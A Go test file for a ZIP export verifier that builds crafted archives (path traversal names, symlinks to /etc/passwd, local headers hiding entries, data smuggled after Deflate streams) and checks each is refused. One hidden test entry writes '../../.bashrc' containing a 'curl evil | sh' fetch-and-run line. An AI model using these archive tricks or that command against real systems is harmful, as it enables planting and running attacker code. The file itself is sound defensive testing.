package gobd

import (
	"archive/zip"
	"bytes"
	"compress/flate"
	"encoding/binary"
	"hash/crc32"
	"io"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// cleanZIP writes the fixture as a ZIP and returns its path and entries.
func cleanZIP(t *testing.T) (*fixture, string, []zipEntryT) {
	t.Helper()
	f := newFixture(t)
	p := filepath.Join(t.TempDir(), "export.zip")
	f.write(t, p)
	return f, p, readZIP(t, p)
}

// Each crafted entry that an unpacker could read differently from verify
// is a name finding (B4 of the plan review).
func TestVerifyZIPSafety(t *testing.T) {
	f, _, entries := cleanZIP(t)
	byName := map[string][]byte{}
	for _, e := range entries {
		byName[e.name] = e.data
	}
	eml := MessagePath(f.msgs[0].m.SHA256, f.msgs[0].m.SortAt, berlin(t))
	nfc := "attest/caf\u00e9.txt"
	nfd := "attest/cafe\u0301.txt"
	for name, c := range map[string]struct {
		edit func([]zipEntryT) []zipEntryT
		kind string
		part string
	}{
		"dot-dot": {func(es []zipEntryT) []zipEntryT {
			return append(es, zipEntryT{name: "mail/../../etc/cron.d/x", data: []byte("x")})
		}, KindName, "path with an empty, . or .. element"},
		"absolute": {func(es []zipEntryT) []zipEntryT {
			return append(es, zipEntryT{name: "/tmp/x", data: []byte("x")})
		}, KindName, "absolute path"},
		"backslash": {func(es []zipEntryT) []zipEntryT {
			return append(es, zipEntryT{name: `mail\x.eml`, data: []byte("x")})
		}, KindName, "backslash"},
		"drive": {func(es []zipEntryT) []zipEntryT {
			return append(es, zipEntryT{name: "C:/x", data: []byte("x")})
		}, KindName, "drive letter"},
		"two messages.csv": {func(es []zipEntryT) []zipEntryT {
			return append(es, zipEntryT{name: MessagesFile, data: []byte("evil")})
		}, KindName, "duplicate entry"},
		"Messages.csv": {func(es []zipEntryT) []zipEntryT {
			return append(es, zipEntryT{name: "Messages.csv", data: byName[MessagesFile]})
		}, KindName, "differs from messages.csv only in case"},
		"upper-case eml": {func(es []zipEntryT) []zipEntryT {
			return append(es, zipEntryT{name: strings.ToUpper(eml[:len(eml)-4]) + ".eml", data: byName[eml]})
		}, KindName, "differs from " + eml},
		"NFC/NFD pair": {func(es []zipEntryT) []zipEntryT {
			return append(es, zipEntryT{name: nfc, data: []byte("a")}, zipEntryT{name: nfd, data: []byte("b")})
		}, KindName, "unexpected file"},
		"unexpected file": {func(es []zipEntryT) []zipEntryT {
			return append(es, zipEntryT{name: "run.sh", data: []byte("x")})
		}, KindName, "run.sh"},
		"directory entry": {func(es []zipEntryT) []zipEntryT {
			return append(es, zipEntryT{name: "mail/", mode: os.ModeDir | 0o700})
		}, KindName, "directory entry"},
		"symlink entry": {func(es []zipEntryT) []zipEntryT {
			return append(es, zipEntryT{name: "attest/link", data: []byte("/etc/passwd"), mode: os.ModeSymlink | 0o777})
		}, KindName, "symbolic link"},
		"same eml twice": {func(es []zipEntryT) []zipEntryT {
			return append(es, zipEntryT{name: eml, data: []byte("evil")})
		}, KindName, "appears twice"},
		"oversized eml": {func(es []zipEntryT) []zipEntryT {
			for i := range es {
				if es[i].name == eml {
					es[i].data = append(bytes.Clone(es[i].data), bytes.Repeat([]byte("A"), 1<<20)...)
				}
			}
			return es
		}, KindName, "larger than expected"},
		"oversized statement": {func(es []zipEntryT) []zipEntryT {
			for i := range es {
				if es[i].name == StatementFile {
					es[i].data = bytes.Repeat([]byte("A"), 9<<20)
				}
			}
			return es
		}, KindName, "larger than expected"},
		"leaves without statement": {func(es []zipEntryT) []zipEntryT {
			return append(es, zipEntryT{name: LeavesPath(1), data: f.leaves[1]})
		}, KindName, "does not include this leaves file"},
	} {
		t.Run(name, func(t *testing.T) {
			es := c.edit(append([]zipEntryT(nil), entries...))
			p := writeZIP(t, es)
			fs, _ := verify(t, p, VerifyOptions{Trusted: f.trusted()})
			if !hasFinding(fs, c.kind, c.part) {
				t.Fatalf("no %s %q finding:\n%s", c.kind, c.part, strings.Join(kinds(fs), "\n"))
			}
		})
	}
	checkLocalHeaderCases(t, f)
	// NFC and NFD of the same name count as duplicates of each other.
	if fold(nfc) != fold(nfd) {
		t.Fatal("NFC and NFD fold differently")
	}
	// The rewritten clean ZIP has no findings, so each case above is
	// caused by its edit.
	fs, _ := verify(t, writeZIP(t, entries), VerifyOptions{Trusted: f.trusted()})
	if len(fs) != 0 {
		t.Fatalf("rewritten clean ZIP: %v", kinds(fs))
	}
}

// A ZIP with more central directory records than an export can have is
// refused before archive/zip reads it into memory.
func TestVerifyZIPTooManyEntries(t *testing.T) {
	var b bytes.Buffer
	zw := zip.NewWriter(&b)
	for i := 0; i <= maxZIPEntries; i++ {
		h := &zip.FileHeader{Name: "x", Method: zip.Store}
		if _, err := zw.CreateRaw(h); err != nil {
			t.Fatal(err)
		}
	}
	if err := zw.Close(); err != nil {
		t.Fatal(err)
	}
	if err := prescanZIP(bytes.NewReader(b.Bytes()), int64(b.Len())); err == nil || !strings.Contains(err.Error(), "more than") {
		t.Fatalf("prescan: %v", err)
	}
	p := filepath.Join(t.TempDir(), "many.zip")
	if err := os.WriteFile(p, b.Bytes(), 0o600); err != nil {
		t.Fatal(err)
	}
	fs, _ := verify(t, p, VerifyOptions{})
	if !hasFinding(fs, KindName, "more than") {
		t.Fatalf("findings: %v", kinds(fs[:min(len(fs), 5)]))
	}
}

// A ZIP with data before the archive (a self-extractor stub, or an
// archive glued to another) is refused: archive/zip would then read
// records from another offset than the prescan.
func TestVerifyZIPPrependedData(t *testing.T) {
	_, p, _ := cleanZIP(t)
	b, err := os.ReadFile(p)
	if err != nil {
		t.Fatal(err)
	}
	glued := append([]byte("MZ stub"), b...)
	if err := prescanZIP(bytes.NewReader(glued), int64(len(glued))); err == nil || !strings.Contains(err.Error(), "data before") {
		t.Fatalf("prescan: %v", err)
	}
	// One long name is refused too.
	var z bytes.Buffer
	zw := zip.NewWriter(&z)
	if _, err := zw.Create(strings.Repeat("a", maxZIPRecordData+1)); err != nil {
		t.Fatal(err)
	}
	_ = zw.Close()
	if err := prescanZIP(bytes.NewReader(z.Bytes()), int64(z.Len())); err == nil {
		t.Fatal("long name accepted")
	}
	// A truncated ZIP is a finding, not a crash.
	cut := filepath.Join(t.TempDir(), "cut.zip")
	if err := os.WriteFile(cut, b[:len(b)/2], 0o600); err != nil {
		t.Fatal(err)
	}
	fs, _ := verify(t, cut, VerifyOptions{})
	if len(fs) != 1 || !hasFinding(fs, KindName, "not a readable export ZIP") {
		t.Fatalf("truncated: %v", kinds(fs))
	}
}

// zipDirectoryOffset finds the same central directory as archive/zip,
// also for zip64.
func TestZIPDirectoryOffsetMatchesArchiveZip(t *testing.T) {
	_, p, _ := cleanZIP(t)
	b, _ := os.ReadFile(p)
	off, err := zipDirectoryOffset(bytes.NewReader(b), int64(len(b)))
	if err != nil {
		t.Fatal(err)
	}
	if binary.LittleEndian.Uint32(b[off:]) != 0x02014b50 {
		t.Fatalf("offset %d is not a central directory record", off)
	}
	// Force zip64 records: archive/zip writes them with more than 65535
	// entries.
	var z bytes.Buffer
	zw := zip.NewWriter(&z)
	for i := 0; i < 70_000; i++ {
		if _, err := zw.CreateRaw(&zip.FileHeader{Name: "x", Method: zip.Store}); err != nil {
			t.Fatal(err)
		}
	}
	_ = zw.Close()
	zb := z.Bytes()
	off, err = zipDirectoryOffset(bytes.NewReader(zb), int64(len(zb)))
	if err != nil {
		t.Fatal(err)
	}
	zr, err := zip.NewReader(bytes.NewReader(zb), int64(len(zb)))
	if err != nil {
		t.Fatal(err)
	}
	if binary.LittleEndian.Uint32(zb[off:]) != 0x02014b50 || len(zr.File) != 70_000 {
		t.Fatalf("zip64: offset %d, %d files", off, len(zr.File))
	}
	// The local-header walk accepts archive/zip's zip64 layout too.
	if err := prescanZIP(bytes.NewReader(zb), int64(len(zb))); err != nil {
		t.Fatalf("prescan of a zip64 ZIP: %v", err)
	}
}

// localHeader returns the offset of the local header named name.
func localHeader(t testing.TB, data []byte, name string) int {
	t.Helper()
	for i := 0; ; {
		j := bytes.Index(data[i:], []byte("PK\x03\x04"))
		if j < 0 {
			t.Fatalf("no local header %s", name)
		}
		at := i + j
		n := int(binary.LittleEndian.Uint16(data[at+26:]))
		if at+30+n <= len(data) && string(data[at+30:at+30+n]) == name {
			return at
		}
		i = at + 4
	}
}

// localHeaderZIPs are ZIPs whose local entries differ from their central
// directory, which archive/zip alone never sees (review A1 of #507): each
// value has the detail verify must give.
func localHeaderZIPs(t testing.TB) map[string]struct {
	data   []byte
	detail string
} {
	t.Helper()
	f := newFixture(t)
	p := filepath.Join(t.TempDir(), "export.zip")
	f.write(t, p)
	clean, err := os.ReadFile(p)
	if err != nil {
		t.Fatal(err)
	}
	out := map[string]struct {
		data   []byte
		detail string
	}{}
	patch := func(name, detail string, edit func(b []byte, at int)) {
		b := bytes.Clone(clean)
		edit(b, localHeader(t, b, ReadmeFile))
		out[name] = struct {
			data   []byte
			detail string
		}{b, detail}
	}
	// (a) The reviewer's probe: the local header names ../evil.sh (same
	// length), the central directory README.txt.
	patch("renamed local header", "the local header has another name than the central directory", func(b []byte, at int) {
		copy(b[at+30:], "../evil.sh")
	})
	patch("local method", "other flags or another method", func(b []byte, at int) {
		binary.LittleEndian.PutUint16(b[at+8:], zip.Store)
	})
	patch("local signature", "no local header at its offset", func(b []byte, at int) {
		b[at+3] = 0x05
	})
	patch("data descriptor", "its data descriptor differs from the central directory", func(b []byte, at int) {
		d := at + bytes.Index(b[at:], []byte("PK\x07\x08"))
		b[d+4] ^= 0xff // the CRC-32
	})

	// (b) The reviewer's probe: a local entry ../../.bashrc first, its
	// central record removed and the end record adjusted.
	entries := readZIP(t, p)
	hidden := writeZIP(t, append([]zipEntryT{{name: "../../.bashrc", data: []byte("curl evil | sh\n")}}, entries...))
	data, err := os.ReadFile(hidden)
	if err != nil {
		t.Fatal(err)
	}
	end := bytes.LastIndex(data, []byte("PK\x05\x06"))
	dirSize := int(binary.LittleEndian.Uint32(data[end+12:]))
	dirOff := int(binary.LittleEndian.Uint32(data[end+16:]))
	first := data[dirOff:]
	recLen := 46 + int(binary.LittleEndian.Uint16(first[28:])) + int(binary.LittleEndian.Uint16(first[30:])) + int(binary.LittleEndian.Uint16(first[32:]))
	var b []byte
	b = append(b, data[:dirOff]...)
	b = append(b, data[dirOff+recLen:end]...)
	eocd := bytes.Clone(data[end:])
	n := binary.LittleEndian.Uint16(eocd[10:]) - 1
	binary.LittleEndian.PutUint16(eocd[8:], n)
	binary.LittleEndian.PutUint16(eocd[10:], n)
	binary.LittleEndian.PutUint32(eocd[12:], uint32(dirSize-recLen)) //nolint:gosec // a small test ZIP
	b = append(b, eocd...)
	out["hidden local entry"] = struct {
		data   []byte
		detail string
	}{b, "is not where the previous entry ends"}

	// A local entry after the last one, before the central directory.
	var w bytes.Buffer
	zw := zip.NewWriter(&w)
	for _, e := range entries {
		h := &zip.FileHeader{Name: e.name, Method: zip.Deflate}
		h.SetMode(0o600)
		ew, _ := zw.CreateHeader(h)
		_, _ = ew.Write(e.data)
	}
	_ = zw.Flush()
	_ = zw.Close()
	tail := w.Bytes()
	end = bytes.LastIndex(tail, []byte("PK\x05\x06"))
	dirOff = int(binary.LittleEndian.Uint32(tail[end+16:]))
	junk := []byte("PK\x03\x04trailing local entry")
	var t2 []byte
	t2 = append(t2, tail[:dirOff]...)
	t2 = append(t2, junk...)
	t2 = append(t2, tail[dirOff:]...)
	end = bytes.LastIndex(t2, []byte("PK\x05\x06"))
	binary.LittleEndian.PutUint32(t2[end+16:], uint32(dirOff+len(junk))) //nolint:gosec // a small test ZIP
	out["trailing local entry"] = struct {
		data   []byte
		detail string
	}{t2, "data between the last entry and the central directory"}
	// Round 2: data hidden inside an entry's compressed size, after the end
	// of its Deflate stream (review A of #507, TestProbeDeflateTail, and B's
	// probe (c)). Copied raw with archive/zip's own writer, so every record,
	// descriptor and size is consistent; only the stream ends early.
	fake := func(name string, content []byte) []byte {
		var b bytes.Buffer
		zw := zip.NewWriter(&b)
		h := &zip.FileHeader{Name: name, Method: zip.Store, CRC32: crc32.ChecksumIEEE(content),
			CompressedSize64: uint64(len(content)), UncompressedSize64: uint64(len(content))}
		w, _ := zw.CreateRaw(h)
		_, _ = w.Write(content)
		_ = zw.Flush()
		return b.Bytes() // the local entry only; Close would add a directory
	}
	rawCopy := func(name, detail string, edit func(fh *zip.FileHeader, raw []byte) []byte) {
		zr, err := zip.NewReader(bytes.NewReader(clean), int64(len(clean)))
		if err != nil {
			t.Fatal(err)
		}
		var b bytes.Buffer
		zw := zip.NewWriter(&b)
		for _, zf := range zr.File {
			r, err := zf.OpenRaw()
			if err != nil {
				t.Fatal(err)
			}
			raw, err := io.ReadAll(r)
			if err != nil {
				t.Fatal(err)
			}
			fh := zf.FileHeader
			if zf.Name == ReadmeFile {
				raw = edit(&fh, raw)
				fh.CompressedSize64 = uint64(len(raw))
			}
			w, err := zw.CreateRaw(&fh)
			if err != nil {
				t.Fatal(err)
			}
			if _, err := w.Write(raw); err != nil {
				t.Fatal(err)
			}
		}
		if err := zw.Close(); err != nil {
			t.Fatal(err)
		}
		out[name] = struct {
			data   []byte
			detail string
		}{b.Bytes(), detail}
	}
	rawCopy("entry hidden after the Deflate stream", "after the end of its Deflate stream", func(fh *zip.FileHeader, raw []byte) []byte {
		desc := make([]byte, 16)
		binary.LittleEndian.PutUint32(desc, 0x08074b50)
		binary.LittleEndian.PutUint32(desc[4:], fh.CRC32)
		binary.LittleEndian.PutUint32(desc[8:], uint32(len(raw)))               //nolint:gosec // a small test entry
		binary.LittleEndian.PutUint32(desc[12:], uint32(fh.UncompressedSize64)) //nolint:gosec // a small test entry
		return append(append(bytes.Clone(raw), desc...), fake("../../.bashrc", []byte("curl evil | sh\n"))...)
	})
	rawCopy("junk after the Deflate stream", "after the end of its Deflate stream", func(_ *zip.FileHeader, raw []byte) []byte {
		return append(bytes.Clone(raw), "junk"...)
	})
	rawCopy("wrong CRC-32 in every record", "does not match its CRC-32", func(fh *zip.FileHeader, raw []byte) []byte {
		fh.CRC32 ^= 1
		return raw
	})
	rawCopy("wrong size in every record", "decompresses to fewer bytes than its records say", func(fh *zip.FileHeader, raw []byte) []byte {
		fh.UncompressedSize64++
		return raw
	})
	rawCopy("Store entry", "uses compression method 0, not Deflate", func(fh *zip.FileHeader, raw []byte) []byte {
		r := flate.NewReader(bytes.NewReader(raw))
		content, err := io.ReadAll(r)
		if err != nil {
			t.Fatal(err)
		}
		fh.Method = zip.Store
		return content
	})
	// A local header with a CRC-32 although a data descriptor follows.
	patch("local CRC with descriptor", "has a CRC-32 or sizes although a data descriptor follows", func(b []byte, at int) {
		binary.LittleEndian.PutUint32(b[at+14:], 1)
	})
	return out
}

// checkLocalHeaderCases runs the localHeaderZIPs cases as sub-tests of
// TestVerifyZIPSafety: each is refused as a whole with its detail.
func checkLocalHeaderCases(t *testing.T, f *fixture) {
	for name, c := range localHeaderZIPs(t) {
		t.Run("local/"+name, func(t *testing.T) {
			p := filepath.Join(t.TempDir(), "x.zip")
			if err := os.WriteFile(p, c.data, 0o600); err != nil {
				t.Fatal(err)
			}
			fs, _ := verify(t, p, VerifyOptions{Trusted: f.trusted()})
			// Layout cases refuse the whole ZIP (one finding); cases inside an
			// entry's data name that entry.
			whole := hasFinding(fs, KindName, "not a readable export ZIP")
			if !hasFinding(fs, KindName, c.detail) || (whole && len(fs) != 1) || (!whole && !hasFinding(fs, KindName, ReadmeFile+" ")) {
				t.Fatalf("want one name finding %q:\n%s", c.detail, strings.Join(kinds(fs), "\n"))
			}
		})
	}
}
